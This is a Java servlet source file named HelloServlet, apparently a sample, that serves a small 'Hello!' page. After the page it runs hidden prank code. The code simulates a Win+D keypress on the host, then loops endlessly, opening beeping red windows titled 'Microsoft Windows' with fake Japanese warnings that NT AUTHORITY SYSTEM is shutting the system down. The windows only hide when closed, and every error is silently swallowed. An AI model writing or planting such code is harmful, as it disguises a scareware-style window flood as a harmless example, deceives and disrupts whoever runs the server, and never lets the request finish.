package jp.co.agilegroup.sample;

import java.awt.AWTException;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Container;
import java.awt.Font;
import java.awt.Robot;
import java.awt.event.KeyEvent;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;



@WebServlet("/HelloServlet")
public class HelloServlet extends HttpServlet {
	private static final long serialVersionUID = 1L;

	public HelloServlet() {
		super();
	}

	protected void doGet(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		Robot rb;
		response.getWriter().append("Hello World.");
		response.setContentType("text/html; charset=Shift_JIS");
		PrintWriter out = response.getWriter();
		out.println(3);
		out.println(2342);
		out.println("<html>");
		out.println("<head>");
		out.println("<title>Hello!</title>");
		out.println("</head>");
		out.println("<body>");
		out.println("<article>");
		out.println("<h1>");
		out.println("Hello!");
		out.println("</h1>");
		out.println("</article>");
		out.println("</body>");
		out.println("</html>");
		out.close();
		try {
			rb = new Robot();
			rb.setAutoDelay(100);
			rb.keyPress(KeyEvent.VK_WINDOWS);
			rb.delay(500);
			rb.keyPress(KeyEvent.VK_D);
			rb.delay(1000);
			rb.keyRelease(KeyEvent.VK_D);
			rb.keyRelease(KeyEvent.VK_WINDOWS);
		} catch (AWTException e) {
			e.printStackTrace();
		}
		ArrayList<JFrame> win = new ArrayList<JFrame>();
		while(true)
		{
			try {
				win.add(new JFrame("Microsoft Windows"));
				for (int po=0 ; po < win.size();po++)
					{
					JFrame mado= win.get(po);
					int y, u;
					y = (int) (Math.random() * 700);
					u = (int) (Math.random() * 1500);      //座標？
					mado.setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
					JPanel p = new JPanel();
					p.setBackground(Color.RED);
					p.setLayout(null);
					//
					JButton button = new JButton("閉じる");
					button.setBounds(420, 250, 80, 30);
					p.add(button);
					//
					JLabel label = new JLabel("システムはシャットダウンされます。進行中の作業をすべて保存し、");
					label.setBounds(45, 100, 460, 20);
					p.add(label);
					Font g = new Font("Serif", Font.PLAIN, 14);
					label.setFont(g);
					//
					JLabel label2 = new JLabel("ログオフしてください。保存されていないデータは失われます。");
					label2.setBounds(45, 120, 460, 20);
					p.add(label2);
					Font h = new Font("Serif", Font.PLAIN, 14);
					label2.setFont(h);
					//
					JLabel label3 = new JLabel("シャットダウンは、NTAUTHORITY￥SYSTEMによって開始されました");
					label3.setBounds(45, 140, 460, 20);
					p.add(label3);
					Font i = new Font("Serif", Font.PLAIN, 14);
					label3.setFont(i);
					//
					JLabel label4 = new JLabel("=============警告==============");
					label4.setBounds(10, 10, 550, 30);
					Font f = new Font("Serif", Font.PLAIN, 30);
					label4.setFont(f);
					p.add(label4);
					Container contentPane = mado.getContentPane();
					contentPane.add(p, BorderLayout.CENTER);
					java.awt.Toolkit.getDefaultToolkit().beep();

					mado.getContentPane().add(p, BorderLayout.CENTER);
					mado.setSize(550, 350);
					mado.setVisible(true);
					mado.setBounds(u, y, 550, 350);

					TimeUnit.MILLISECONDS.sleep(130);
					}

				}
			catch (Exception e) {	}
			continue;

		}

	}

	protected void doPost(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		doGet(request, response);
	}

}
